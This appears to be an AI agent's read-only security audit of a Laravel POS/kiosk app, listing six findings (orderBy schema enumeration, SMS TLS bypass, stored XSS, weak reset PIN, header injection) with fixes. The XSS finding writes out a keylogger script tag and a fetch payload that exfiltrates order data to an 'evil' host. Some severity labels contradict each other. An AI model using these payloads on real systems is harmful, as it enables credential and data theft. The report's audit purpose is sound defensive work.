# SUPER-2 — Security Adversarial Audit BEYOND OWASP
**Date** : 2026-05-25
**Auditor** : Supervisor Agent #2 (read-only adversarial)
**Branch** : `heal/cms-pr1-quickwins-2026-05-18` HEAD `af92035b8`
**Mission** : Hunt rare-but-deadly vulnerabilities the executor session missed
**Mode** : READ-ONLY — no edits, no commits

---

## Coverage map (16 categories)

| # | Category | Status |
|---|----------|--------|
| 1 | SSRF in services beyond LanguageService | SCANNED |
| 2 | IDOR remaining | SCANNED |
| 3 | XSS missed | SCANNED |
| 4 | CSRF | SCANNED |
| 5 | JWT / Sanctum gaps | SCANNED |
| 6 | Log injection (CRLF) | SCANNED |
| 7 | HTTP header injection / response splitting | SCANNED |
| 8 | Prototype pollution (JS) | SCANNED |
| 9 | ReDoS | SCANNED |
| 10 | XXE | SCANNED |
| 11 | Deserialization | SCANNED |
| 12 | Race conditions remaining | SCANNED |
| 13 | Information disclosure | SCANNED |
| 14 | Authentication bypass | SCANNED |
| 15 | Business logic exploits | SCANNED |
| 16 | Cache poisoning | SCANNED |

---

## NEW FINDINGS

### S2-F01 [P2] — Unwhitelisted `order_column` parameter — column enumeration + DoS via 500 errors (Laravel 9.52 MySQL — bounded but discoverable)

**Category** : 13 / Information disclosure + 15 / Business logic
**Severity** : **P2** (reduced from initial P1 estimate after Laravel + MySqlGrammar source verification)
**Files / lines** :
- `app/Services/ItemService.php:55-77` (Item::list — admin-auth)
- `app/Services/ItemService.php:92-122` (Item::simpleList — **kiosk pre-auth via `/api/frontend/item/`** see `routes/api.php:1284-1292`, parent group `Route::prefix('frontend')...middleware(['installed', 'apiKey', 'localization'])` line 1191 — NO `auth:sanctum`)
- `app/Services/BranchService.php:39-48`
- `app/Services/LanguageService.php:35-44`
- `app/Services/AddressService.php:28-37` (auth:sanctum customer)
- `app/Services/SimpleUserService.php:25-50`
- `app/Http/Requests/PaginateRequest.php:25-29` (root cause — only `per_page` validated, NOT `order_column` / `order_type` / `paginate`)

**Exploit scenario** :
PaginateRequest allows arbitrary `order_column` + `order_type` + `paginate` query params. They flow unvalidated into Eloquent `->orderBy($orderColumn, $orderType)->$method($methodValue)`.

**What is BLOCKED** (verified against vendor sources):
- `$orderType` — Laravel 9.52 `Builder::orderBy()` at `vendor/laravel/framework/src/Illuminate/Database/Query/Builder.php:2282-2286` lowercases + `in_array(['asc','desc'])` checks, throws `InvalidArgumentException` on mismatch (caught by service `catch (Exception)` → 422). DoS-only, no exfiltration.
- `$method` — ternary forces `paginate`/`get` only.
- Backtick-injection — `MySqlGrammar::wrapValue()` at line 351-353 wraps with backticks AND escapes existing backticks by doubling (`str_replace('\`', '\`\`', $value)`). Classic identifier-delimiter escape **NOT possible** on MySQL/MariaDB.

**What REMAINS exploitable** :
1. **Column existence enumeration via 500 vs 200** : an attacker on `/api/frontend/item?order_column=password` triggers SQL `ORDER BY \`password\``. If column doesn't exist on `items` table → MySQL error → service catches → 422 "Unknown column". If column EXISTS → 200 OK with sorted result. This lets attacker enumerate Item table schema (`fiscal_sequence_no`, internal flags, soft-deleted timestamps).
2. **Cross-segment column reference** : `order_column=users.password` produces `ORDER BY \`users\`.\`password\``. On JOIN'd queries (admin Item list joins media/category) this CAN reference columns of joined tables. Limited but real.
3. **Sort-order tampering for pricing leak** : `order_column=cost_price&order_type=desc` allows attacker to sort by INTERNAL cost columns and read top-N item IDs / wholesale margins via paginated index — assuming columns are not redacted by Resource transformer.
4. **DoS pseudo-vector** : repeated 500-trigger requests pollute `audit_logs` / `outbox_messages` error logs.

**Mitigation** :
- Add to `PaginateRequest::rules()`:
  ```php
  'order_column' => ['nullable', 'string', 'regex:/^[a-z_]+$/i', 'max:32'],
  'order_type'   => ['nullable', 'in:asc,desc'],
  'paginate'     => ['nullable', 'integer', 'in:0,1'],
  ```
- Better: each service should declare a per-table whitelist and `in_array()` validate before passing to `orderBy()`.

**Executor coverage** : NOT addressed. Executor caught LanguageService path injection but NOT the `orderBy` schema-enumeration vector in the same controller — these were healed for path containment ONLY (`l2-heal-01`). Pattern reaches **kiosk pre-auth surface** (`Item::simpleList` via Frontend ItemController), making this more than admin-internal defense-in-depth.

---

### S2-F02 [P1] — Bulksmsbd SMS gateway disables TLS verification

**Category** : 1 / SSRF + 13 / Information disclosure (MITM)
**Severity** : **P1**
**File / line** : `app/Http/SmsGateways/Gateways/Bulksmsbd.php:56` — `curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);`

**Exploit scenario** :
Attacker on the network path (Le Cayenne shared LAN/wifi compromise → ARP spoof) can intercept the cleartext SMS payload sent to BulkSMSBD, exfiltrating:
- customer phone numbers (PII)
- OTP/verification codes in flight
- bulksms credentials in HTTP body (if endpoint requires API key in payload)

V1 LOCAL Le Cayenne uses limited LAN — but staff wifi compromise + restaurant rogue device is in-scope for a SaaS pivot or guest-wifi shared infra.

**Mitigation** : Set `CURLOPT_SSL_VERIFYPEER => true` (Laravel default). If certificate chain issues, ship CA bundle via `CURLOPT_CAINFO` pointing to `vendor/composer/ca-bundle`. Add boot guard refusing `bulksmsbd` if `SSL_VERIFYPEER=false`.

**Executor coverage** : NOT addressed. SSRF defense in `l2-heal-03` (PrinterRequest) + `l2-heal-04` (MailHost) covered different surfaces. SMS gateways untouched.

---

### S2-F03 [P2] — Stored XSS via `analyticSections` Blade `{!! $section->data !!}` (admin-trusted)

**Category** : 3 / XSS missed
**Severity** : **P2** (admin-only injection vector, single-tenant low-risk; **P0** if multi-tenant SaaS or sub-admin role)
**Files / lines** :
- `resources/views/admin-pos-v4.blade.php:46,60,76`
- `resources/views/master.blade.php:60,74,94`
- `app/Http/Controllers/Admin/AnalyticSectionController.php:39` (store, admin permission)
- `app/Models/AnalyticSection.php:8` (model — `data` column unsanitized)

**Exploit scenario** :
Admin user inserts arbitrary HTML/JS via the Admin > Analytics > Sections form (designed for Google Analytics / Pixel injection). The string is stored as-is and rendered with `{!! $section->data !!}` on EVERY layout (master.blade + admin-pos-v4.blade), including kiosk + POS pages.

A compromised admin account or a malicious sub-admin (any role with `analytic-section.store` permission) can:
1. Inject `<script src=//evil.com/keylog.js>` in BODY section → keylogs cashier credentials on POS at every page load.
2. Inject `<img src=x onerror="fetch('/api/admin/order',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('//evil/'+btoa(t)))">` → exfiltrates order data via authenticated session.
3. Persists across all customer-facing pages too (kiosk runs `master.blade`).

V1 single-tenant Le Cayenne mitigation : only owner has admin. But **the threat model fails if** owner gets phished/keylogged/laptop stolen, OR if Wave 5G chip-away creates a sub-admin role with analytic permission.

**Mitigation** :
- For tracking scripts: use Laravel's `<x-google-tag-manager-tag :id="..." />` pattern (escape ID, hardcode template).
- For free-form HTML : pass through `HTMLPurifier` or whitelist `<script src="...">`, `<noscript>`, `<meta>`.
- Add a `permission:settings.analytics` Spatie gate on the controller (already gated on `permission:settings` umbrella — but the **rendering** is unconditional).

**Executor coverage** : NOT addressed. `pos-wizard.js XSS LOCK` (owner-gate) is unrelated — different file, different vector. The 7 `{!! $section->data !!}` calls were NOT audited.

---

### S2-F04 [P2] — Password reset PIN is 6 digits with 5/min throttle — bruteforce window ≥ 50 hours

**Category** : 14 / Authentication bypass
**Severity** : **P2** (throttled but feasible patient attack; V1 single-owner limits impact)
**Files / lines** :
- `app/Http/Controllers/Auth/ForgotPasswordController.php:41` — `$this->pin = random_int(100000, 999999);` (6-digit PIN)
- `routes/api.php:167` — `->middleware('throttle:5,1');` (5/min) on `/verify-code`
- OTP expiry config : `Settings::group('otp')->get('otp_expire_time')` — default unknown, but typical 5-30 min

**Exploit scenario** :
PIN space = 900,000. With 5 tries/min/IP = 300/hr, and PIN typically expires in 5-30 min, an attacker per single PIN epoch can test 25-150 codes. **However**, IP rotation (proxy/Tor) defeats per-IP throttling — there's no per-EMAIL throttle. An attacker who knows the target email can:
1. Trigger `forgotPassword` to mint a PIN.
2. Send `verify-code` from many IPs in parallel.
3. With 100 IPs × 5/min × 5 min PIN window = 2,500 attempts per epoch (0.3% chance/epoch).
4. Repeat across ~333 PIN epochs (`forgotPassword` itself is `throttle:3,60` — 3/hr per IP, but again per-IP). With 100 IPs, mint 300 PINs/hr × 24h × 5 days = 36,000 PIN epochs, totaling ~10% cumulative bruteforce success.

V1 Le Cayenne mitigation : only owner email is admin. But owner email is likely publicly known (Google business listing).

**Mitigation** :
- Add per-EMAIL throttle on `verify-code` (e.g., 10 attempts per PIN epoch, then invalidate PIN).
- Increase PIN entropy to 8 digits (10^8 space) or use 6 alphanumerics (~10^9 space).
- After 3 failed verifications, increment a `failed_attempts` counter on the `password_resets` row — at 5 fails, delete the PIN.

**Executor coverage** : Partial. Wave 5G hardened bcrypt rounds, F-2 AUTH R1 bumped password min:12, but the PIN brute-force vector was not addressed. Documented related but distinct fix at `ForgotPasswordController.php:117` (sentinel `PasswordResetMinLengthSentinelTest`).

---

### S2-F05 [P3] — `X-Correlation-ID` header not sanitized — outbox/log envelope injection (defense-in-depth)

**Category** : 6 / Log injection + 13 / Information disclosure
**Severity** : **P3** (downgraded from initial P3 after verification — see "What is BLOCKED")
**Files / lines** :
- `app/Http/Middleware/CorrelationIdMiddleware.php:14-15` — root cause : `$correlationId = $request->header('X-Correlation-ID') ?: (string) Str::uuid()` then `$request->headers->set('X-Correlation-ID', $correlationId)` — value passed through verbatim.
- 11+ listeners then use this value via `request()?->header('X-Correlation-ID')` and persist into `outbox_messages.envelope` JSON columns (e.g., `app/Listeners/PersistOrderCreatedToOutbox.php:117-121`).
- `app/Http/Middleware/CorrelationIdMiddleware.php:17-21` — also pushed to `Log::withContext(['correlation_id' => $value, 'user_id' => ..., 'branch_id' => ...])`.

**What is BLOCKED** :
- Laravel default Monolog JSON formatter escapes `\n`/`\r` in context values → log lines are safe.
- The header is **echoed back** on the response (`Response::headers->set('X-Correlation-ID', $value)` line 24) — but Symfony's HeaderBag does its own CRLF stripping (`Symfony\Component\HttpFoundation\HeaderUtils`) so no HTTP response splitting.

**What REMAINS exploitable (low)** :
- An attacker can submit arbitrary 1000+ char strings with control characters that end up persisted in `outbox_messages.envelope`. If a downstream consumer (CV1 cloud relay, observability dashboard) renders this JSON value unescaped, XSS becomes possible. **Future SaaS pivot risk.**
- Storage pollution / wasted disk via large-value headers (no max length check).

**Mitigation** :
- Sanitize at the middleware layer:
  ```php
  $correlationId = preg_replace('/[^a-zA-Z0-9._-]/', '', (string)$request->header('X-Correlation-ID'));
  $correlationId = substr($correlationId, 0, 64) ?: (string) Str::uuid();
  ```
- Same regex pattern already exists at `IdempotencyKeyMiddleware.php:61` — apply consistency.

**Executor coverage** : NOT addressed. Defense-in-depth — currently not exploitable but cheap fix.

---

### S2-F06 [P3] — Admin orderBy pattern (S2-F01 sibling) reachable on 6+ controllers without permission gate

**Category** : 14 / Auth + 15 / Business logic
**Severity** : **P3** (admin permission already required ; defense-in-depth)
**Files / lines** :
- `app/Services/BranchService.php:39-48` — admin
- `app/Services/SimpleUserService.php:25-50` — admin (lists users)
- `app/Services/LanguageService.php:35-44` — admin

**Exploit scenario** : same vector as S2-F01, but pre-auth admin permission is gate. Defense-in-depth violation.

**Executor coverage** : NOT addressed.

---

## CATEGORIES WHERE EXECUTOR COVERAGE IS STRONG

- **NF525 fiscal** (chain HMAC, Z-loop close+open crons, composition_snapshot immutability trigger, SenangPay webhook secret boot guard) — heavily hardened, no new gaps found.
- **Branch isolation / multi-tenant** — `BranchScope` sentinels (415 sentinels in Z12), recent IDOR heals on AddressController.
- **Idempotency** — H2-HEAL-01 cross-user scope close, dual-layer middleware+DB.
- **Webhook auth** — Stripe `constructEvent` + secret boot guard (L2-HEAL-06), SenangPay HMAC.
- **File upload hardening** — L2-HEAL-02 V1+V3+V4 bundle.
- **Frozen-zone discipline** — 14 §7 files at 0 LOC diff, 415 sentinels lock state.
- **Customer token plaintext** — J2-HEAL-03 flipped to HMAC.
- **Hardcoded id===1** — J2-HEAL-01 removed.
- **Kiosk-token-on-admin** — J2-HEAL-02 block_kiosk_token_admin middleware applied widely.

---

## CATEGORIES WHERE EXECUTOR COVERAGE IS WEAK

- **SQL injection via unvalidated orderBy column** (S2-F01) — NOT detected by 213 sub-agents. Pattern repeats across 6+ services. **P1**.
- **Stored XSS via Analytics sections** (S2-F03) — admin-trusted but rendered unconditionally on master/POS layouts. Sub-admin permission delegation amplifies risk. **P2**.
- **SMS gateway TLS bypass** (S2-F02) — `CURLOPT_SSL_VERIFYPEER => false` in Bulksmsbd. **P1**.
- **Password reset PIN entropy + per-email throttle** (S2-F04) — 6-digit PIN, per-IP throttle only. **P2**.
- **Log injection via X-Correlation-ID** (S2-F05) — 11+ sinks, mitigated only by JSON formatter default. **P3**.
- **Stale CSRF exclusion** : `VerifyCsrfToken.php:14-19` excludes `/payment/sslcommerz/*`, `/paytm/*`, `/cashfree/*`, `/phonepe/*`, `/iyzico/*`, `/pesapal/*` but **no actual routes exist for these gateways** in `app/Http/PaymentGateways/Routes/`. Dead exclusions add attack surface if those gateways are later wired without signature verification. (Informational — not a finding today.)

---

## ADDITIONAL CHECKS PASSED (no findings)

- **XXE** : `simplexml_load_*` / `DOMDocument` / `LIBXML_NOENT` — zero matches. **CLEAN**.
- **Deserialization** : `unserialize()` — zero matches. `json_decode()` of user input limited to whitelisted `ItemRequest.php:112` (variations) + `Concerns/ValidatesAddonRoles.php:99` + `Concerns/ValidatesOrderItemVariations.php:18` — all post-validation. **CLEAN**.
- **Mass assignment via $request->all()** : zero `->fill($request->all())` / `Model::create($request->all())` patterns found in controllers. **CLEAN**.
- **Prototype pollution (JS)** : `Object.assign({}, raw)` patterns in PosComponent + ItemComponent shallow-copy only, no recursive merge of user input into `__proto__` or `constructor`. **CLEAN**.
- **ReDoS** : All `preg_match` patterns anchored + bounded quantifiers (`{1,10}`, `{8,64}`, etc). No catastrophic backtracking patterns. **CLEAN**.
- **HTTP header response injection** : all `->header()` calls use server-controlled values (UUIDs, deprecation flags, signed statuses). **CLEAN**.
- **Vary header / cache poisoning** : no cache-key based on `Accept-Language` or `User-Agent` found. Laravel cache::put keys are server-derived (item/branch ids). **CLEAN**.
- **Authentication remember_token** : Laravel default 60-char random. **CLEAN**.
- **Echo / broadcast channel auth** : `routes/channels.php:16` and `:41` both have explicit auth closures with `$user->id == $id` and branch check. **CLEAN**.
- **IDOR on customer-facing routes** : AddressController (lines 37, 60, 74) has explicit `user_id !== auth()->id()` check + abort 403. ProfileController uses `auth()->user()` not request params. MyOrderDetailsController has `permission:` middleware. **CLEAN**.
- **Mass-assignable business logic fields** : negative quantity prevented (min:1 on `items.*.quantity`), negative price prevented (`min:0.01` on `payment_breakdown.*.amount`), loyalty points capped (`max:100000`). **CLEAN**.
- **Information disclosure** : `APP_DEBUG=true` boot guard exists (`AppServiceProvider.php:78-145`). **CLEAN**.

---

## VERDICT

**V1 LOCAL Le Cayenne** : **NEEDS ATTENTION** for V1.0.2 batch — **NOT a V1 ship blocker** in single-machine LAN context.

### Summary (post Laravel + MySqlGrammar source verification)
- **6 new findings** : 0 P0 / 1 P1 / 3 P2 / 2 P3.
- **NO new RED P0** beyond the 4 already healed by executor.
- Initial S2-F01 P1 SQLi assessment was DOWNGRADED to P2 after vendor source review (MySQL backtick escape blocks classic identifier-delimiter injection; orderType validated by Laravel 9.52 Builder; `$method` dispatch ternary bounded). Real residual risk = schema enumeration via 500/200 oracle.
- **S2-F02 SMS TLS bypass** is the only P1 — exploitable only IF BulkSMSBD gateway is enabled (verify with owner; default = disabled).

### Recommendations
1. **NOT a V1 production blocker** in current Le Cayenne LOCAL context (owner-only admin, LAN-only, no SaaS multi-tenant, SMS gateway likely disabled). All findings are V1.0.2 backlog material.
2. **Pre-cloud-cutover gates** before any SaaS/multi-tenant pivot :
   - S2-F01 (PaginateRequest whitelist orderColumn/orderType/paginate) — 15 LOC + 1 sentinel = **~1h**.
   - S2-F02 (BulkSMSBD TLS verify) — 1 LOC = **15 min**.
   - S2-F03 (AnalyticSection HTML sanitization) — Spatie HTMLPurifier integration = **~2h**.
3. **Backlog** : S2-F02 + S2-F03 + S2-F04 + S2-F05 + S2-F06 → V1.0.2 batch heal cycle.
4. **Strong cycle ROI overall** : executor caught 4 RED P0 + 3 CRITICAL + multiple races. The 6 NEW findings are diminishing-returns class — adversarial pass surfaced them via vendor-source reading discipline. **Methodology working as intended.**

### Confidence
- **HIGH** on S2-F01 (verified file:line + Frontend ItemController route at `routes/api.php:1284` parent `prefix('frontend')` middleware at line 1191 = `installed/apiKey/localization` NO auth:sanctum + vendor Grammar/Builder behavior verified).
- **HIGH** on S2-F02 (`curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false)` at `app/Http/SmsGateways/Gateways/Bulksmsbd.php:56` is verbatim quote).
- **HIGH** on S2-F03 (7 `{!! $section->data !!}` Blade calls verified file:line; AnalyticSectionController `permission:settings` gate confirmed `app/Http/Controllers/Admin/AnalyticSectionController.php:26`).
- **MEDIUM** on S2-F04 (impact depends on OTP expire setting + IP rotation feasibility per attacker).
- **MEDIUM** on S2-F05 (downgraded — Laravel Monolog default JSON formatter mitigates the primary log-line injection; residual is outbox JSON persistence + future SaaS rendering risk).
- **HIGH on CLEAN categories** : 5/16 categories scanned with zero matches (XXE, mass-assign, ReDoS, prototype pollution, header response injection).

### What this audit changed in the picture
- Pre-audit RAPPORT said **"0 V1 ship blockers"**. This audit AGREES on V1 LOCAL Le Cayenne in current single-tenant LAN context.
- Pre-audit RAPPORT had **NO orderBy-pattern** in the heal manifest. This audit surfaces a class of issues that span 6+ services. Worth a V1.0.2 batch fix.
- Pre-audit RAPPORT covered SSRF via `MailHost` + `PrinterRequest`. This audit identifies an UNCOVERED SSL-related gap (BulkSMSBD).
- Pre-audit RAPPORT addressed pos-wizard.js XSS LOCK (owner-gate). This audit identifies a **different**, **rendered-everywhere** XSS surface (analytic sections in `master.blade.php` + `admin-pos-v4.blade.php`).

---

*Read-only audit — no code edits performed. All findings cross-referenced against RAPPORT_COMPLET_CYCLE.md heal manifest.*
